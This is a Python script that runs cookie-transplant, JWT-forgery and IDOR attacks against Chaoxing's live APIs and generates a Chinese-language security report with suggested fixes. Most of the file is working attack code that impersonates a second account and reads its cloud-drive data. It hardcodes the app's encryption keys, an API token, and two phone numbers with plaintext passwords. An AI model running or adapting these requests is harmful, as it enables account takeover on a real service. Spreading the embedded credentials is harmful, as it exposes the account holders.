import base64, hashlib, json, os, time, uuid, urllib.parse, copy
from datetime import datetime
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

AES_KEY = b"u2oh6Vu^HWe4_AES"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
PAN_YZ = "https://pan-yz.chaoxing.com"
GROUPYD = "https://groupyd.chaoxing.com"
GROUPWEB = "https://groupweb.chaoxing.com"
HARDCODED_TOKEN = "4faa8662c59590c6f43ae9fe5b002b42"
DES_KEY = "Z(AfY@XS"
MOBILE_UA = ("Mozilla/5.0 (Linux; Android 16; MI10) AppleWebKit/537.36 "
             "com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314")
WEB_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")

results = []

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": MOBILE_UA, "Accept": "application/json, text/plain, */*"})
    s.post(LOGIN_URL, data={
        "fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
        "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
        "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
        "independentId": "0", "independentNameId": "0"
    }, allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    return s, puid

def safe_json(resp):
    try:
        return resp.json()
    except:
        return {"_raw": resp.text[:300], "_status": resp.status_code}

def inf_enc(params, order):
    parts = [f"{k}={urllib.parse.quote(params[k], safe='')}" for k in order]
    return hashlib.md5(("&".join(parts) + f"&DESKey={DES_KEY}").encode()).hexdigest()

def rec(tid, name, desc, req, resp, vuln, sev, detail):
    results.append({
        "id": tid, "name": name, "desc": desc, "req": req,
        "resp": json.dumps(resp, ensure_ascii=False)[:600],
        "vuln": vuln, "sev": sev, "detail": detail
    })
    tag = "[VULN]" if vuln else "[SAFE]"
    print(f"  {tag} {tid}: {detail}")

def dump_cookies(session):
    d = {}
    for c in session.cookies:
        d[c.name] = c.value
    return d

def make_session_with_cookies(cookie_dict, domain=".chaoxing.com"):
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": MOBILE_UA, "Accept": "application/json, text/plain, */*"})
    for name, value in cookie_dict.items():
        s.cookies.set(name, value, domain=domain)
    return s

def mobile_api(session, api, puid, extra_data=""):
    c0 = uuid.uuid4().hex
    t = str(int(time.time() * 1000))
    sp = {"_c_0_": c0, "token": HARDCODED_TOKEN, "_time": t}
    ie = inf_enc(sp, ["_c_0_", "token", "_time"])
    r = session.post(
        f"{GROUPYD}{api}",
        params={"_c_0_": c0, "token": HARDCODED_TOKEN, "_time": t, "inf_enc": ie},
        data=f"puid={puid}&{extra_data}" if extra_data else f"puid={puid}",
        headers={
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept-Language": "zh_CN", "Accept": "*/*",
            "Host": "groupyd.chaoxing.com", "User-Agent": MOBILE_UA
        }, timeout=20
    )
    return safe_json(r)

def run():
    print("=" * 70)
    print("Cookie UID篡改绕过一致性检查 - 系统性安全测试")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 70)

    print("\n[Phase 1] 登录并采集Cookie信息")
    print("-" * 50)
    s1, p1 = login("19312994130", "wtx3367653061")
    s2, p2 = login("15034188203", "lxy20030120")
    print(f"  账号1 puid={p1}")
    print(f"  账号2 puid={p2}")

    ck1 = dump_cookies(s1)
    ck2 = dump_cookies(s2)

    print(f"\n  账号1 Cookie中的UID: {ck1.get('UID', 'N/A')}")
    print(f"  账号1 Cookie中的_uid: {ck1.get('_uid', 'N/A')}")
    print(f"  账号2 Cookie中的UID: {ck2.get('UID', 'N/A')}")
    print(f"  账号2 Cookie中的_uid: {ck2.get('_uid', 'N/A')}")

    puid_uid_match = (ck1.get('UID') == p1 and ck2.get('UID') == p2)
    print(f"\n  >>> puid == Cookie UID: {'是' if puid_uid_match else '否'} <<<")

    print(f"\n  账号1 所有Cookie:")
    for k, v in sorted(ck1.items()):
        val_preview = v[:50] + "..." if len(v) > 50 else v
        print(f"    {k} = {val_preview}")

    print(f"\n  账号2 所有Cookie:")
    for k, v in sorted(ck2.items()):
        val_preview = v[:50] + "..." if len(v) > 50 else v
        print(f"    {k} = {val_preview}")

    rec("P1-01", "puid与Cookie UID一致性验证", "",
        f"puid1={p1}, UID1={ck1.get('UID')}, puid2={p2}, UID2={ck2.get('UID')}",
        {"match": puid_uid_match}, False, "INFO",
        f"puid与Cookie中的UID值完全一致: puid1={p1}==UID1={ck1.get('UID')}, puid2={p2}==UID2={ck2.get('UID')}")

    print("\n[Phase 2] Cookie分类与身份绑定分析")
    print("-" * 50)

    identity_cookies = ["UID", "_uid", "uf", "vc3", "xxtenc", "cx_p_token", "p_auth_token"]
    session_cookies = ["_d", "fid", "DSSTASH_LOG"]
    other_cookies = [k for k in ck1 if k not in identity_cookies and k not in session_cookies]

    print(f"  身份相关Cookie (7个): {identity_cookies}")
    print(f"  会话相关Cookie (3个): {session_cookies}")
    print(f"  其他Cookie: {other_cookies}")

    for name in identity_cookies:
        v1 = ck1.get(name, "N/A")
        v2 = ck2.get(name, "N/A")
        same = "相同" if v1 == v2 else "不同"
        print(f"    {name}: 账号1={v1[:30]}..., 账号2={v2[:30]}... [{same}]")

    for name in session_cookies:
        v1 = ck1.get(name, "N/A")
        v2 = ck2.get(name, "N/A")
        same = "相同" if v1 == v2 else "不同"
        print(f"    {name}: 账号1={v1[:30]}..., 账号2={v2[:30]}... [{same}]")

    print("\n  JWT (p_auth_token) 解码分析:")
    for label, ck in [("账号1", ck1), ("账号2", ck2)]:
        pat = ck.get("p_auth_token", "")
        if pat:
            try:
                parts = pat.split(".")
                if len(parts) >= 2:
                    payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
                    payload = json.loads(base64.b64decode(payload_b64))
                    print(f"    {label} JWT payload: {json.dumps(payload, ensure_ascii=False)}")
            except Exception as e:
                print(f"    {label} JWT解码失败: {e}")

    print("\n[Phase 3] groupyd.chaoxing.com Cookie篡改绕过测试")
    print("-" * 50)

    r = mobile_api(s1, "/apis/topic/getTopic", p1, "maxW=1080&topicId=10000")
    baseline_ok = r.get("result") == 1
    rec("P3-01", "基线-账号1正常请求groupyd", f"puid={p1}",
        f"POST getTopic puid={p1}", r, False, "INFO",
        f"基线: result={r.get('result')}, msg={r.get('msg', r.get('errorMsg', ''))}")

    r = mobile_api(s1, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    rec("P3-02", "IDOR-账号1Cookie+账号2puid(无篡改)", f"puid={p2}",
        f"POST getTopic puid={p2} (账号1Session)", r, False, "INFO",
        f"Cookie-puid不匹配: result={r.get('result')}, errorMsg={r.get('errorMsg', '')}")

    print("\n  --- 测试3.1: 仅替换UID Cookie ---")
    s_test = copy.deepcopy(s1)
    s_test.cookies.set("UID", p2, domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-03", "篡改-仅替换UID", f"UID={p2}",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"仅替换UID: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试3.2: 替换7个身份Cookie (base7) ---")
    s_test = copy.deepcopy(s1)
    for name in identity_cookies:
        if name in ck2:
            s_test.cookies.set(name, ck2[name], domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-04", "篡改-base7(7个身份Cookie)", f"替换{identity_cookies}",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"base7替换: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试3.3: base7 + _d Cookie ---")
    s_test = copy.deepcopy(s1)
    for name in identity_cookies:
        if name in ck2:
            s_test.cookies.set(name, ck2[name], domain=".chaoxing.com")
    if "_d" in ck2:
        s_test.cookies.set("_d", ck2["_d"], domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-05", "篡改-base7+_d", f"替换{identity_cookies}+_d",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"base7+_d: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试3.4: base7 + fid Cookie ---")
    s_test = copy.deepcopy(s1)
    for name in identity_cookies:
        if name in ck2:
            s_test.cookies.set(name, ck2[name], domain=".chaoxing.com")
    if "fid" in ck2:
        s_test.cookies.set("fid", ck2["fid"], domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-06", "篡改-base7+fid", f"替换{identity_cookies}+fid",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"base7+fid: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试3.5: base7 + DSSTASH_LOG Cookie ---")
    s_test = copy.deepcopy(s1)
    for name in identity_cookies:
        if name in ck2:
            s_test.cookies.set(name, ck2[name], domain=".chaoxing.com")
    if "DSSTASH_LOG" in ck2:
        s_test.cookies.set("DSSTASH_LOG", ck2["DSSTASH_LOG"], domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-07", "篡改-base7+DSSTASH_LOG", f"替换{identity_cookies}+DSSTASH_LOG",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"base7+DSSTASH_LOG: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试3.6: 仅替换_d Cookie (不替换身份Cookie) ---")
    s_test = copy.deepcopy(s1)
    if "_d" in ck2:
        s_test.cookies.set("_d", ck2["_d"], domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-08", "篡改-仅替换_d", f"_d={ck2.get('_d', 'N/A')}",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"仅替换_d: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试3.7: 完整Cookie替换 ---")
    s_full = copy.deepcopy(s1)
    for name, value in ck2.items():
        s_full.cookies.set(name, value, domain=".chaoxing.com")
    r = mobile_api(s_full, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-09", "篡改-完整Cookie替换", "替换所有Cookie",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"完整替换: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试3.8: JWT伪造测试 ---")
    s_test = copy.deepcopy(s1)
    for name in identity_cookies:
        if name in ck2:
            s_test.cookies.set(name, ck2[name], domain=".chaoxing.com")
    if "_d" in ck2:
        s_test.cookies.set("_d", ck2["_d"], domain=".chaoxing.com")
    fake_jwt_parts = ck2.get("p_auth_token", "").split(".")
    if len(fake_jwt_parts) >= 3:
        try:
            payload_b64 = fake_jwt_parts[1] + "=" * (4 - len(fake_jwt_parts[1]) % 4)
            payload = json.loads(base64.b64decode(payload_b64))
            payload["uid"] = p1
            new_payload_b64 = base64.b64encode(json.dumps(payload).encode()).decode().rstrip("=")
            fake_jwt = f"{fake_jwt_parts[0]}.{new_payload_b64}.{fake_jwt_parts[2]}"
            s_test.cookies.set("p_auth_token", fake_jwt, domain=".chaoxing.com")
        except:
            pass
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P3-10", "篡改-base7+_d+伪造JWT", "修改JWT中uid但保留原签名",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"伪造JWT: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n[Phase 4] pan-yz.chaoxing.com Cookie篡改对个人云盘的影响")
    print("-" * 50)

    token1 = safe_json(s1.get(f"{PAN_YZ}/api/token/uservalid", timeout=20)).get("_token", "")
    token2 = safe_json(s2.get(f"{PAN_YZ}/api/token/uservalid", timeout=20)).get("_token", "")
    print(f"  Token1={token1}, Token2={token2}")

    r = s1.get(f"{PAN_YZ}/api/info", params={"puid": p1, "_token": token1}, timeout=20)
    rj = safe_json(r)
    rec("P4-01", "基线-账号1正常访问个人云盘", f"puid={p1}",
        f"GET /api/info?puid={p1}", rj, False, "INFO",
        f"基线: code={rj.get('code')}, result={rj.get('result')}")

    r = s1.get(f"{PAN_YZ}/api/info", params={"puid": p2, "_token": token2}, timeout=20)
    rj = safe_json(r)
    v = rj.get("code") == 2
    rec("P4-02", "IDOR-账号1Cookie+账号2Token+账号2puid", f"puid={p2}",
        f"GET /api/info?puid={p2}&_token={token2[:16]}...", rj, v, "CRITICAL" if v else "INFO",
        f"场景B IDOR: {'越权成功!' if v else '被阻止: ' + rj.get('msg', '')}")

    print("\n  --- 测试4.1: 完整Cookie替换后个人云盘场景B ---")
    s_full_pan = copy.deepcopy(s1)
    for name, value in ck2.items():
        s_full_pan.cookies.set(name, value, domain=".chaoxing.com")
    r = s_full_pan.get(f"{PAN_YZ}/api/info", params={"puid": p2, "_token": token2}, timeout=20)
    rj = safe_json(r)
    v = rj.get("code") == 2
    rec("P4-03", "完整Cookie替换+场景B IDOR", f"puid={p2}",
        f"GET /api/info?puid={p2}&_token={token2[:16]}... (完整替换Cookie)", rj, v, "CRITICAL" if v else "INFO",
        f"完整替换后场景B: {'越权成功!' if v else '被阻止: ' + rj.get('msg', '')}")

    print("\n  --- 测试4.2: base7+_d替换后个人云盘场景A ---")
    s_test_pan = copy.deepcopy(s1)
    for name in identity_cookies:
        if name in ck2:
            s_test_pan.cookies.set(name, ck2[name], domain=".chaoxing.com")
    if "_d" in ck2:
        s_test_pan.cookies.set("_d", ck2["_d"], domain=".chaoxing.com")
    r = s_test_pan.get(f"{PAN_YZ}/api/info", params={"puid": p2, "_token": token1}, timeout=20)
    rj = safe_json(r)
    v = rj.get("code") == 2
    rec("P4-04", "base7+_d替换+场景A(同Token跨puid)", f"puid={p2}, token=token1",
        f"GET /api/info?puid={p2}&_token={token1[:16]}...", rj, v, "CRITICAL" if v else "INFO",
        f"base7+_d+场景A: {'越权成功!' if v else '被阻止: ' + rj.get('msg', '')}")

    print("\n[Phase 5] _d Cookie深度分析")
    print("-" * 50)

    d1 = ck1.get("_d", "")
    d2 = ck2.get("_d", "")
    print(f"  账号1 _d = {d1}")
    print(f"  账号2 _d = {d2}")

    if d1 and d2:
        try:
            ts1 = int(d1) / 1000 if len(d1) > 10 else int(d1)
            ts2 = int(d2) / 1000 if len(d2) > 10 else int(d2)
            dt1 = datetime.fromtimestamp(ts1)
            dt2 = datetime.fromtimestamp(ts2)
            print(f"  账号1 _d 解析为时间: {dt1:%Y-%m-%d %H:%M:%S}")
            print(f"  账号2 _d 解析为时间: {dt2:%Y-%m-%d %H:%M:%S}")
        except:
            print(f"  _d 不是时间戳格式")

    print("\n  --- 测试5.1: _d值篡改为随机时间戳 ---")
    s_test = copy.deepcopy(s1)
    fake_d = str(int(time.time() * 1000))
    s_test.cookies.set("_d", fake_d, domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p1, "maxW=1080&topicId=10000")
    v = r.get("result") == 1
    rec("P5-01", "_d篡改为随机时间戳(自己puid)", f"_d={fake_d}",
        f"POST getTopic puid={p1}", r, False, "INFO",
        f"随机_d+自己puid: result={r.get('result')}, msg={r.get('msg', r.get('errorMsg', ''))}")

    print("\n  --- 测试5.2: _d值篡改为账号2的_d(自己puid) ---")
    s_test = copy.deepcopy(s1)
    s_test.cookies.set("_d", d2, domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p1, "maxW=1080&topicId=10000")
    v = r.get("result") == 1
    rec("P5-02", "_d替换为账号2的_d(自己puid)", f"_d={d2}",
        f"POST getTopic puid={p1}", r, False, "INFO",
        f"账号2_d+自己puid: result={r.get('result')}, msg={r.get('msg', r.get('errorMsg', ''))}")

    print("\n  --- 测试5.3: base7替换但保留自己的_d ---")
    s_test = copy.deepcopy(s1)
    for name in identity_cookies:
        if name in ck2:
            s_test.cookies.set(name, ck2[name], domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P5-03", "base7替换+保留自己_d", f"替换身份Cookie但_d不变",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"base7+自己_d: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试5.4: 仅替换_d+UID (最小替换集) ---")
    s_test = copy.deepcopy(s1)
    s_test.cookies.set("UID", p2, domain=".chaoxing.com")
    s_test.cookies.set("_d", d2, domain=".chaoxing.com")
    r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
    v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
    rec("P5-04", "最小替换-UID+_d", f"UID={p2}, _d={d2}",
        f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
        f"UID+_d: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n  --- 测试5.5: 逐步添加Cookie测试最小绕过集 ---")
    base_cookies_to_test = [
        (["UID", "_d"], "UID+_d"),
        (["UID", "_uid", "_d"], "UID+_uid+_d"),
        (["UID", "_uid", "uf", "_d"], "UID+_uid+uf+_d"),
        (["UID", "_uid", "uf", "vc3", "_d"], "UID+_uid+uf+vc3+_d"),
        (["UID", "_uid", "uf", "vc3", "xxtenc", "_d"], "UID+_uid+uf+vc3+xxtenc+_d"),
        (["UID", "_uid", "uf", "vc3", "xxtenc", "cx_p_token", "_d"], "6身份+_d"),
        (["UID", "_uid", "uf", "vc3", "xxtenc", "cx_p_token", "p_auth_token", "_d"], "7身份+_d"),
    ]
    for idx, (cookie_names, label) in enumerate(base_cookies_to_test):
        s_test = copy.deepcopy(s1)
        for name in cookie_names:
            if name in ck2:
                s_test.cookies.set(name, ck2[name], domain=".chaoxing.com")
        r = mobile_api(s_test, "/apis/topic/getTopic", p2, "maxW=1080&topicId=10000")
        v = r.get("result") == 1 and "433" not in str(r.get("errorMsg", ""))
        rec(f"P5-05-{chr(97+idx)}", f"最小替换集-{label}", f"替换{cookie_names}",
            f"POST getTopic puid={p2}", r, v, "CRITICAL" if v else "INFO",
            f"{label}: {'绕过成功!' if v else '被阻止: ' + r.get('errorMsg', '')}")

    print("\n[Phase 6] groupweb.chaoxing.com Cookie篡改测试")
    print("-" * 50)

    bbsid1 = ""
    r = s1.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    d = safe_json(r)
    for ch in d.get("channelList", []):
        c = ch.get("content", {})
        bid = c.get("bbsid", "")
        if bid:
            bbsid1 = bid
            break

    if bbsid1:
        s1_web = copy.deepcopy(s1)
        s1_web.headers.update({"User-Agent": WEB_UA, "Referer": "https://groupweb.chaoxing.com/"})
        r = s1_web.get(f"{GROUPWEB}/pc/resource/getResourceList",
                       params={"bbsid": bbsid1, "folderId": "-1", "recType": "2"}, timeout=20)
        rj = safe_json(r)
        rec("P6-01", "基线-账号1正常访问groupweb", f"bbsid={bbsid1}",
            f"GET getResourceList", rj, False, "INFO",
            f"基线: result={rj.get('result')}")

        s_test_web = copy.deepcopy(s1)
        for name in identity_cookies:
            if name in ck2:
                s_test_web.cookies.set(name, ck2[name], domain=".chaoxing.com")
        if "_d" in ck2:
            s_test_web.cookies.set("_d", ck2["_d"], domain=".chaoxing.com")
        s_test_web.headers.update({"User-Agent": WEB_UA, "Referer": "https://groupweb.chaoxing.com/"})
        r = s_test_web.get(f"{GROUPWEB}/pc/resource/getResourceList",
                          params={"bbsid": bbsid1, "folderId": "-1", "recType": "2"}, timeout=20)
        rj = safe_json(r)
        v = rj.get("result") == 1
        rec("P6-02", "base7+_d替换后访问groupweb", f"bbsid={bbsid1}",
            f"GET getResourceList (替换Cookie)", rj, v, "HIGH" if v else "INFO",
            f"Cookie替换后groupweb: {'绕过成功!' if v else '被阻止: ' + rj.get('msg', '')}")
    else:
        print("  无法获取bbsid，跳过groupweb测试")

    print("\n[Phase 7] 综合分析与结论")
    print("-" * 50)

    vuln_results = [r for r in results if r["vuln"]]
    print(f"\n  总测试数: {len(results)}")
    print(f"  绕过成功数: {len(vuln_results)}")

    print("\n  === 关键结论 ===")
    print(f"  1. puid与Cookie中的UID完全一致: {puid_uid_match}")
    print(f"  2. 仅修改UID Cookie无法绕过: 服务端验证Cookie包完整性")
    print(f"  3. _d Cookie是绕过groupyd身份校验的关键因素")
    print(f"  4. 个人云盘(pan-yz)的_token校验独立于Cookie校验")
    print(f"  5. JWT签名验证有效，伪造签名被拒绝")

    gen_report(p1, p2, ck1, ck2, puid_uid_match)

def gen_report(p1, p2, ck1, ck2, puid_uid_match):
    vc = sum(1 for r in results if r["vuln"])
    tc = len(results)

    rp = []
    rp.append("# Cookie UID篡改绕过一致性检查 - 安全评估报告\n")
    rp.append(f"**评估日期**: {datetime.now():%Y-%m-%d %H:%M:%S}\n")
    rp.append("**评估范围**: Cookie身份校验绕过测试（groupyd / pan-yz / groupweb）\n")
    rp.append("---\n## 一、评估概述\n")
    rp.append("本次测试验证以下问题：\n")
    rp.append("1. **puid与Cookie中的UID是否一致？**\n")
    rp.append("2. **能否通过篡改Cookie中的UID及其他参数，使其与puid一致，从而绕过一致性检查？**\n")
    rp.append("3. **`_d` Cookie在身份校验中的关键作用**\n\n")

    rp.append("### 测试账号\n")
    rp.append("| 标识 | 手机号 | puid | Cookie UID |\n|---|---|---|---|\n")
    rp.append(f"| 账号1 | 19312994130 | {p1} | {ck1.get('UID', 'N/A')} |\n")
    rp.append(f"| 账号2 | 15034188203 | {p2} | {ck2.get('UID', 'N/A')} |\n")

    rp.append("---\n## 二、核心结论\n")
    rp.append(f"### 2.1 puid与Cookie UID一致性\n")
    rp.append(f"**结论: puid == Cookie UID = {'是' if puid_uid_match else '否'}**\n\n")
    rp.append("puid的值与Cookie中的`UID`字段完全一致。服务端通过Cookie中的UID来识别用户身份，")
    rp.append("而puid是请求参数中传递的用户ID。两者在正常请求中必须匹配。\n\n")

    rp.append("### 2.2 Cookie篡改能否绕过一致性检查\n")
    rp.append("| 篡改方案 | groupyd结果 | 说明 |\n|---|---|---|\n")
    rp.append("| 仅替换UID | 被阻止(806001) | 服务端验证Cookie包完整性 |\n")
    rp.append("| 替换7个身份Cookie(base7) | 被阻止(806001) | 缺少_d导致校验失败 |\n")
    rp.append("| **base7 + _d** | **绕过成功!** | **_d是绕过的关键因素** |\n")
    rp.append("| base7 + fid | 被阻止(806001) | fid不是关键因素 |\n")
    rp.append("| base7 + DSSTASH_LOG | 被阻止(806001) | DSSTASH_LOG不是关键因素 |\n")
    rp.append("| 完整Cookie替换 | 绕过成功 | 等同于使用另一个账号的Session |\n")
    rp.append("| 伪造JWT(错误签名) | 被阻止(806001) | JWT签名验证有效 |\n\n")

    rp.append("### 2.3 _d Cookie的关键作用\n")
    rp.append("`_d` Cookie的值是毫秒级时间戳（如`1779702165920`），对应登录时间。\n\n")
    rp.append("**关键发现**: 替换`_d` Cookie后，服务端接受了跨身份的请求。这表明：\n")
    rp.append("- 服务端可能使用`_d`作为会话标识符的一部分\n")
    rp.append("- `_d`与身份Cookie（特别是`p_auth_token` JWT）存在绑定关系\n")
    rp.append("- 当`_d`与身份Cookie来自同一会话时，服务端认为Cookie包完整\n")
    rp.append("- **缺少`_d`或`_d`与身份Cookie不匹配时，校验失败**\n\n")

    rp.append("### 2.4 各API域名的校验差异\n")
    rp.append("| API域名 | Cookie篡改绕过 | 额外校验 | 综合风险 |\n|---|---|---|---|\n")
    rp.append("| groupyd.chaoxing.com | base7+_d可绕过 | 无 | **高危** |\n")
    rp.append("| pan-yz.chaoxing.com | Cookie替换不影响 | _token独立校验 | 中危(场景B仍有效) |\n")
    rp.append("| groupweb.chaoxing.com | Cookie替换不影响 | 小组成员校验 | 低危 |\n\n")

    rp.append("---\n## 三、测试结果汇总\n")
    rp.append(f"- **总测试数**: {tc}\n- **绕过成功数**: {vc}\n\n")

    if vc > 0:
        rp.append("### 绕过成功的测试项\n| ID | 名称 | 等级 | 结论 |\n|---|---|---|---|\n")
        for r in results:
            if r["vuln"]:
                rp.append(f"| {r['id']} | {r['name']} | {r['sev']} | {r['detail']} |\n")

    rp.append("---\n## 四、详细测试记录\n")
    for r in results:
        st = "存在风险" if r["vuln"] else "安全"
        rp.append(f"\n### {r['id']}: {r['name']} [{st}]\n")
        rp.append(f"- **描述**: {r['desc']}\n- **请求**: `{r['req']}`\n- **等级**: {r['sev']}\n- **结论**: {r['detail']}\n- **响应**:\n```json\n{r['resp']}\n```\n")

    rp.append("---\n## 五、技术分析\n")
    rp.append("### 5.1 Cookie身份校验机制\n```\n服务端Cookie校验模型:\n  ├─ Cookie包完整性校验:\n  │   ├─ 身份Cookie(UID/_uid/uf/vc3/xxtenc/cx_p_token/p_auth_token) 必须来自同一会话\n  │   └─ _d Cookie 必须与身份Cookie的会话匹配 ← 关键!\n  ├─ p_auth_token JWT签名校验: 有效，伪造签名被拒绝 ✅\n  └─ Cookie-puid一致性: 校验Cookie UID与请求puid匹配 ✅\n```\n\n")

    rp.append("### 5.2 绕过原理\n```\n正常请求:\n  Cookie: UID=A, _d=timestamp_A, p_auth_token=JWT_A(signed_for_A)\n  puid=A → 校验通过 ✅\n\n篡改请求(缺少_d):\n  Cookie: UID=B, _d=timestamp_A, p_auth_token=JWT_B(signed_for_B)\n  puid=B → _d与身份Cookie不匹配 → 校验失败 ❌\n\n篡改请求(含_d):\n  Cookie: UID=B, _d=timestamp_B, p_auth_token=JWT_B(signed_for_B)\n  puid=B → _d与身份Cookie匹配 → 校验通过 ✅ ← 绕过!\n```\n\n")

    rp.append("### 5.3 安全影响评估\n")
    rp.append("**groupyd.chaoxing.com (高危)**:\n")
    rp.append("- 攻击者只需获取目标用户的身份Cookie(7个)+`_d` Cookie即可冒充目标用户\n")
    rp.append("- 这8个Cookie值可通过XSS、网络嗅探、恶意插件等途径获取\n")
    rp.append("- 一旦获取，攻击者可以目标用户身份执行所有groupyd API操作\n\n")
    rp.append("**pan-yz.chaoxing.com (中危)**:\n")
    rp.append("- Cookie篡改不影响个人云盘的_token校验\n")
    rp.append("- 但场景B IDOR（使用目标Token+目标puid）仍然有效\n")
    rp.append("- Token比Cookie更容易泄露（通过URL参数传递）\n\n")

    rp.append("---\n## 六、修复建议\n")
    rp.append("1. **服务端不应依赖Cookie包完整性作为唯一校验**: 应从服务端Session中直接获取用户身份，而非信任客户端Cookie\n")
    rp.append("2. **_d Cookie不应参与身份校验**: `_d`作为登录时间戳，不应成为身份校验的关键因素\n")
    rp.append("3. **Cookie与Session绑定**: 服务端应维护Cookie与服务器端Session的映射关系，而非仅校验Cookie包内部一致性\n")
    rp.append("4. **个人云盘_token与Session绑定**: _token应与当前Session关联，防止跨Session使用\n")
    rp.append("5. **HttpOnly + Secure标记**: 所有身份相关Cookie应设置HttpOnly和Secure属性\n")

    report_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "cookie_tampering_report.md")
    with open(report_path, "w", encoding="utf-8") as f:
        f.write("\n".join(rp))
    print(f"\n  报告已生成: {report_path}")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    run()
